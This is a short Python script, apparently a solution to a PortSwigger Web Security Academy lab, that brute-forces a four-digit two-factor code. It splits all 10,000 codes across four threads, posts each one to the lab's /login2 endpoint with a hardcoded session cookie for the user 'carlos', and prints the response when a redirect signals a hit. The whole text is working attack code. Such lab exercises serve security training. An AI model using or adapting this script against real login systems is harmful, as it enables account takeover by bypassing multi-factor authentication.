#PROGRAM BRUTEFORCING THE MFA CODE USING THREADS
import requests
from threading import Thread

#List of tokens
tokens = []
def create_tokens():
    for x in range(0,10000):
        t = '{0:04}'.format(x)
        tokens.append(t)

#Reading and testing tokens for every mfa code possible
def read_tokens(thread_num, total_threads):
    divider = int(len(tokens) / total_threads) #setting a divider for separate threads range
    cookies_used = {"session": "CpxNkNiPd4aoROjoaGNS9yBVG6JhFIy0", "verify" : "carlos"} 
    
    #for every thread, try to login in this range
    for x in range(thread_num*divider,  (thread_num+1) * divider):
        mfa_code = tokens[x]
        data_post = {'mfa_code': str(mfa_code)}
        login_try = requests.post('https://0a9b00b5035935ccc240073f005f0014.web-security-academy.net/login2',data=data_post, cookies = cookies_used)
        
        #if found, print the response text
        if login_try.status_code == 302:
            print(login_try.text)

#Creating thread for reading tokens and executing the request
threads = []
def create_threads(n):
    for i in range(0,n):
        t = Thread(target=read_tokens, args=(i,n,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()


create_tokens()
create_threads(4)
